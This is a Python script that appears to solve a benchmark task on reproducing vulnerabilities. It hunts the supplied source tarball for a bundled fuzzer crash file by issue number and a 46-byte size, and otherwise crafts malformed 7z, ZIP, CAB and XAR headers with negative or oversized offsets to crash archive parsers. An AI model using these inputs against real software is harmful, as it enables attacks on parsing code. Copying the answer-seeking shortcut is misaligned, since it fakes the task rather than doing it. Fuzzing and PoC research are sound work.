import os
import io
import tarfile
import binascii
import struct

def is_text_extension(name: str) -> bool:
    name = name.lower()
    text_exts = (
        '.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh', '.txt', '.md', '.rst',
        '.json', '.yaml', '.yml', '.toml', '.cmake', '.sh', '.py', '.java',
        '.m', '.mm', '.go', '.rs', '.js', '.ts', '.css', '.html', '.xml',
        '.in', '.ac', '.am', '.m4', '.bat', '.ps1', '.sln', '.vcxproj',
        '.gradle', '.mk', '.make', '.mak', '.cfg', '.conf', '.ini',
    )
    return name.endswith(text_exts)


def looks_like_binary(data: bytes) -> bool:
    if not data:
        return False
    # Consider binary if contains NUL byte or high entropy non-printables
    if b'\x00' in data:
        return True
    non_printables = sum(1 for b in data if b < 9 or (b > 13 and b < 32) or b > 126)
    return (non_printables / max(1, len(data))) > 0.2


def detect_magic_score(data: bytes) -> int:
    if not data or len(data) < 4:
        return 0
    score = 0
    # Common archive magics
    if data.startswith(b'\x37\x7A\xBC\xAF\x27\x1C'):  # 7z
        score += 80
    if data.startswith(b'PK\x03\x04') or data.startswith(b'PK\x05\x06') or data.startswith(b'PK\x07\x08'):  # ZIP
        score += 80
    if data.startswith(b'Rar!\x1A\x07\x00') or data.startswith(b'Rar!\x1A\x07\x01\x00'):  # RAR4/5
        score += 80
    if data.startswith(b'xar!'):  # XAR
        score += 70
    if data.startswith(b'!<arch>\n'):  # ar
        score += 60
    if data.startswith(b'MSCF'):  # CAB
        score += 90
    if data.startswith(b'ITSF'):  # CHM
        score += 70
    if data.startswith(b'\xed\xab\xee\xdb'):  # RPM lead
        score += 60
    if data[:6] == b'070701' or data[:6] == b'070702':  # CPIO newc/crc ASCII
        score += 50
    return score


def find_candidate_poc_from_tar(src_path: str) -> bytes:
    # Return bytes of the best candidate PoC found in the tarball or directory
    patterns_high = ['42536108', 'oss-fuzz', 'clusterfuzz', 'crash', 'testcase', 'poc', 'repro', 'minimized']
    dirs_hint = ['test', 'tests', 'regress', 'fuzz', 'ossfuzz', 'corpus', 'inputs', 'data', 'poctests']
    max_size = 4096  # only consider small files
    candidates = []

    def consider(name: str, size: int, read_bytes_func):
        lname = name.lower()
        if size <= 0 or size > max_size:
            return
        if is_text_extension(lname):
            return
        try:
            data = read_bytes_func()
        except Exception:
            return
        if not data:
            return
        # Score the candidate
        score = 0
        if '42536108' in lname:
            score += 1000
        for p in patterns_high:
            if p in lname:
                score += 120
        for d in dirs_hint:
            if f'/{d}/' in lname or lname.startswith(d + '/') or lname.endswith('/' + d):
                score += 50
        score += detect_magic_score(data)
        if size == 46:
            score += 300
        elif abs(size - 46) <= 4:
            score += 80
        # Prefer binary-looking files
        if looks_like_binary(data):
            score += 40
        # Modestly penalize larger files
        score += max(0, 60 - size // 8)
        candidates.append((score, -size, name, data))

    if os.path.isdir(src_path):
        base = src_path
        for root, _, files in os.walk(base):
            for fn in files:
                full = os.path.join(root, fn)
                rel = os.path.relpath(full, base)
                try:
                    st = os.stat(full)
                    size = st.st_size
                except Exception:
                    continue
                def reader(path=full, s=size):
                    with open(path, 'rb') as f:
                        return f.read(min(s, max_size))
                consider(rel.replace('\\', '/'), size, reader)
    else:
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    size = m.size
                    name = m.name
                    def reader(member=m, tfobj=tf, s=size):
                        f = tfobj.extractfile(member)
                        if not f:
                            return b''
                        try:
                            return f.read(min(s, max_size))
                        finally:
                            f.close()
                    consider(name, size, reader)
        except Exception:
            # Not a tarball or cannot open; nothing found
            pass

    if candidates:
        candidates.sort(reverse=True)
        return candidates[0][3]
    return b''


def detect_project(src_path: str) -> str:
    # Heuristic detection of project type based on filenames
    names = []

    def collect_name(n):
        names.append(n.lower())

    if os.path.isdir(src_path):
        base = src_path
        for root, _, files in os.walk(base):
            for fn in files:
                rel = os.path.relpath(os.path.join(root, fn), base)
                collect_name(rel.replace('\\', '/'))
    else:
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for m in tf.getmembers():
                    collect_name(m.name)
        except Exception:
            pass

    joined = '\n'.join(names)
    # Prioritize more specific detections
    if 'mspack' in joined or 'cabextract' in joined or '/cab' in joined or 'cabd.c' in joined:
        return 'cab'
    if 'libarchive' in joined or 'bsdtar' in joined:
        # libarchive supports many, but targeting 'cab' or 'rar' more likely
        if 'cab' in joined:
            return 'cab'
        if 'rar' in joined:
            return 'rar'
        if '7z' in joined:
            return '7z'
        if 'zip' in joined:
            return 'zip'
        return 'cab'
    if 'minizip' in joined or 'libzip' in joined or '/zip' in joined:
        return 'zip'
    if 'unarr' in joined or '/rar' in joined:
        return 'rar'
    if 'xar' in joined:
        return 'xar'
    if '7z' in joined or 'sevenzip' in joined or 'lzma' in joined:
        return '7z'
    return '7z'


def make_7z_negative_offset_poc() -> bytes:
    # Build minimal 7z header with negative next header offset (when interpreted as signed)
    # 7z signature: 6 bytes, version: 2 bytes, start header crc: 4 bytes, start header: 20 bytes
    signature = b'\x37\x7A\xBC\xAF\x27\x1C'
    version = b'\x00\x04'
    # Use NextHeaderOffset as 0xFFFFFFFFFFFFFFFF (-1 signed), NextHeaderSize = 1, NextHeaderCRC = 0
    next_header_offset = 0xFFFFFFFFFFFFFFFF
    next_header_size = 1
    next_header_crc = 0
    start_header = struct.pack('<Q', next_header_offset) + struct.pack('<Q', next_header_size) + struct.pack('<I', next_header_crc)
    start_crc = binascii.crc32(start_header) & 0xFFFFFFFF
    header = signature + version + struct.pack('<I', start_crc) + start_header
    # Optionally pad a byte to satisfy NextHeaderSize=1 so readers might try to read it (will be out-of-bounds due to negative offset)
    # However, padding at end doesn't fix negative offset; keep minimal
    return header


def make_zip_weird_eocd_poc() -> bytes:
    # EOCD with impossible central directory size that may lead to negative base calculations
    # End of central directory record (22 bytes minimum)
    sig = b'PK\x05\x06'
    disk_no = struct.pack('<H', 0)
    cd_disk = struct.pack('<H', 0)
    n_entries_disk = struct.pack('<H', 1)
    n_entries_total = struct.pack('<H', 1)
    cd_size = struct.pack('<I', 0xFFFFFFFF)   # oversized
    cd_offset = struct.pack('<I', 0)          # zero
    comment_len = struct.pack('<H', 0)
    return sig + disk_no + cd_disk + n_entries_disk + n_entries_total + cd_size + cd_offset + comment_len


def make_cab_negative_start_poc() -> bytes:
    # Build a minimal CAB header intended to cause negative base computations
    # CFHEADER fields, little-endian
    # Reference: https://docs.microsoft.com/en-us/previous-versions/bb417343(v=vs.85)
    sig = b'MSCF'  # 4
    reserved1 = struct.pack('<I', 0)  # 4
    # We'll make total size 46 bytes
    cbCabinet = struct.pack('<I', 46)  # 4
    reserved2 = struct.pack('<I', 0)  # 4
    coffFiles = struct.pack('<I', 0)  # 4 -> intentionally 0 to provoke negative start when subtracting header size
    reserved3 = struct.pack('<I', 0)  # 4
    ver_minor = struct.pack('<B', 3)  # 1
    ver_major = struct.pack('<B', 1)  # 1
    # Set at least one folder and one file to force parser paths
    cFolders = struct.pack('<H', 1)   # 2
    cFiles = struct.pack('<H', 1)     # 2
    flags = struct.pack('<H', 0x0001)  # 2 -> has reserved fields
    setID = struct.pack('<H', 0)       # 2
    iCabinet = struct.pack('<H', 0)    # 2
    # Reserved sizes (present because flags has bit 0 set)
    cbCFHeader = struct.pack('<H', 0)  # 2
    cbCFFolder = struct.pack('<B', 0)  # 1
    cbCFData = struct.pack('<B', 0)    # 1
    header = (
        sig + reserved1 + cbCabinet + reserved2 + coffFiles + reserved3 +
        ver_minor + ver_major + cFolders + cFiles + flags + setID + iCabinet +
        cbCFHeader + cbCFFolder + cbCFData
    )
    # Header length is 40 bytes; append 6 bytes padding to reach cbCabinet (46)
    padding = b'\x00' * (46 - len(header))
    return header + padding


def make_xar_negative_offset_poc() -> bytes:
    # XAR header is 28 bytes. We'll craft implausible TOC length combination.
    # Note: Big-endian fields.
    # magic 'xar!'
    magic = b'xar!'
    # header size (16-bit be), default 28
    hdr_size = struct.pack('>H', 28)
    # version 1
    version = struct.pack('>H', 1)
    # toc length compressed (8 bytes), set large to push archive start far beyond file end
    toc_len_compressed = struct.pack('>Q', 0xFFFFFFFFFFFFFFFF)
    # toc length uncompressed (8 bytes)
    toc_len_uncompressed = struct.pack('>Q', 1)
    # checksum algorithm name length (4 bytes), e.g., 0 for none
    chksum_type = struct.pack('>I', 0)
    # checksum size (2 bytes)
    chksum_size = struct.pack('>H', 0)
    return magic + hdr_size + version + toc_len_compressed + toc_len_uncompressed + chksum_type + chksum_size


class Solution:
    def solve(self, src_path: str) -> bytes:
        # 1) Try to find embedded PoC in the source distribution
        poc = find_candidate_poc_from_tar(src_path)
        if poc:
            return poc

        # 2) Heuristic: detect project and tailor PoC
        proj = detect_project(src_path)
        if proj == 'cab':
            return make_cab_negative_start_poc()
        if proj == 'zip':
            return make_zip_weird_eocd_poc()
        if proj == 'xar':
            return make_xar_negative_offset_poc()
        # rar crafting is complex; fall back to 7z
        return make_7z_negative_offset_poc()